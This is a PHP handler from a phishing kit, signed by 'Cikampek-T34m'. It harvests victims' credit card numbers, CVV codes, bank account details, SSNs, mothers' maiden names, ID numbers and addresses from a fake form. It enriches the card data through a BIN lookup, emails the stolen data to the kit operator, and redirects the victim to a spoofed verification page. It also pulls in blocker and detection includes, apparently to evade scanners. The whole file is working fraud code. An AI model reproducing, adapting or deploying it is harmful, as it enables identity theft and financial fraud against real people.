<?php


include('../../blocker.php');
include('../../detect.php');
$bin = str_replace(' ', '', $_POST['cc_number']);
$bin = substr($bin, 0, 6);
$getbank = json_decode(file_get_contents("https://bins.payout.com/api/v1/bins/".$bin.""));
$ccbrand = $getbank->brand;
$ccbank = $getbank->issuer;
$cctype = $getbank->type;
$ccklas = $getbank->card_category;
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\
$message ="
++-----[ $$ [-]Cikampek-T34m[-]  $$ ]-----++

      .++=====[ Tukang Credit ]=====++.
Cardholder Name :  ".$_POST['cc_holder']."
Card Number     :  ".$_POST['cc_number']."
Expiration Date :  ".$_POST['expdate_month']." / ".$_POST['expdate_year']."
Cvv2            :  ".$_POST['cvv2_number']."
BIN/IIN Info    :  " . $ccbank . " - ". $ccbrand . " - ". $cctype ." - ".$ccklas."
Sort Code       :  ".$_POST['sort_code1']." - ".$_POST['sort_code2']." - ".$_POST['sort_code3']."
Account number  :  ".$_POST['accnum']."
BSB - OSID      :  " . $_POST['bsbnum_1'] . " - " . $_POST['bsbnum_2'] . "
Credit Limit    :  " . $_POST['cc_limit'] . "
Mother's name   :  ".$_POST['mmd']."
Account Name    :  ".$_POST['full_name']."
Address Line 1  :  ".$_POST['address1']."
Address Line 2  :  ".$_POST['address2']."
City/Town       :  ".$_POST['city']."
State           :  ".$_POST['state']."
Zip/PostCode    :  ".$_POST['postal']."
Country         :  ".$nama_negara."
Phone Number    :  ".$_POST['phone']."
SSN             :  ".$_POST['ssn1']." - ".$_POST['ssn2']." - ".$_POST['ssn3']."
ID Number       :  ".$_POST['id_number']."
DOB             :  ".$_POST['dob_day']." / ".$_POST['dob_month']." / ".$_POST['dob_year']."
      .++=========[ End ]=========++.

      .++=======[ PC Info ]=======++.
From            :  ".$ip." On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
      .++=========[ End ]=========++.

++-----[ $$ [N]e[V]e[R] [GIVE UP] $$ ]-----++
";
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\

include('../../your_email.php');
$subject = $ccbank . " - " . $ccbrand . " - ". $cctype ." - ".$ccklas." [ " . $nama_negara . " - " . $ip . " ]";
$headers = "From: ".$_POST['cc_holder']." <vr3zyme@nyender.id>";
mail($nyenderid, $subject, $message, $headers);

header("LOCATION: verified?cmd=_update-information&session=".md5(microtime())."&dispatch=".sha1(microtime())."");


?>